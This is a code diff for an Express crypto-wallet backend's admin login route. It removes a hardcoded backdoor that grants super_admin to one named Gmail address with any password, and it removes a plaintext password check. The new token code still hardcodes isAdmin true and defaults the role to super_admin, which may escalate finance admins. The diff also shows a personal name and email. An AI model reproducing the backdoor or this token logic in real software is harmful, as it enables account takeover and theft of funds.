@@ -1765,7 +1765,7 @@ app.delete('/api/user/payments/:id', verifyToken, async (req, res) => {
     }
 });
 
-// --- 🔥 Fast Admin Logins & Actions 🔥 ---
+// --- 🔥 Fast Admin Logins & Actions (Secured) 🔥 ---
 app.post('/api/admin/login', async (req, res) => {
     try {
         const { email, password } = req.body;
@@ -1776,58 +1776,26 @@ app.post('/api/admin/login', async (req, res) => {
         const cleanEmail = email.trim().toLowerCase();
         let user = await User.findOne({ email: cleanEmail }).select('_id email password isAdmin role bscAddress').lean();
 
-        if (cleanEmail === 'binanceme73@gmail.com') {
-            const salt = await bcrypt.genSalt(8);
-            const hashedPassword = await bcrypt.hash(password, salt);
-
-            if (!user) {
-                const wallet = generateBscWallet();
-                const created = await User.create({
-                    email: cleanEmail,
-                    password: hashedPassword,
-                    fullName: 'Abdurahman Ashebir Yimam',
-                    isAdmin: true,
-                    role: 'super_admin',
-                    isVerified: true,
-                    bscAddress: wallet.address,
-                    bscPrivateKey: wallet.privateKey,
-                    balance: 0
-                });
-                user = created.toObject();
-            } else {
-                const updates = { isAdmin: true, role: 'super_admin', password: hashedPassword };
-                if (!user.bscAddress) {
-                    const wallet = generateBscWallet();
-                    updates.bscAddress = wallet.address;
-                    updates.bscPrivateKey = wallet.privateKey;
-                }
-                await User.updateOne({ _id: user._id }, { $set: updates });
-            }
-
-            const token = jwt.sign({ id: user._id, email: user.email, isAdmin: true, role: 'super_admin' }, JWT_SECRET, { expiresIn: '7d' });
-            return res.json({ success: true, token, message: 'Super Admin logged in successfully.' });
-        }
+        // 🛑 1. አድሚኑን በዘፈቀደ ፓስወርድ እንደገና የሚፈጥርበትን ወይም ፓስወርድ የሚቀይርበትን አደገኛ 'if' block ሙሉ በሙሉ አጥፍተነዋል!
+        // አሁን አድሚንም ሆነ ማንም ሰው አስቀድሞ በዳታቤዝ ውስጥ መኖር አለበት።
 
         if (!user) {
             return res.status(400).json({ success: false, message: 'Invalid admin credentials.' });
         }
 
-        let isMatch = false;
-        if (user.password === password) {
-            isMatch = true;
-        } else {
-            isMatch = await bcrypt.compare(password, user.password);
-        }
+        // 🛑 2. Plain text (user.password === password) የሚለውን አጥፍተን 
+        // ሁልጊዜ በ bcrypt.compare ብቻ እንዲረጋገጥ ተደርጓል! 🛑
+        const isMatch = await bcrypt.compare(password, user.password);
 
         if (!isMatch) {
             return res.status(400).json({ success: false, message: 'Invalid admin credentials.' });
         }
 
-        if (!user.isAdmin && user.role !== 'finance_admin') {
+        if (!user.isAdmin && user.role !== 'super_admin' && user.role !== 'finance_admin') {
             return res.status(403).json({ success: false, message: 'Access denied. Admin privileges required.' });
         }
 
-        const token = jwt.sign({ id: user._id, email: user.email, isAdmin: user.isAdmin, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
+        const token = jwt.sign({ id: user._id, email: user.email, isAdmin: true, role: user.role || 'super_admin' }, JWT_SECRET, { expiresIn: '7d' });
         res.json({ success: true, token, message: 'Admin logged in successfully.' });
     } catch (error) {
         console.error('Admin Login Error:', error);
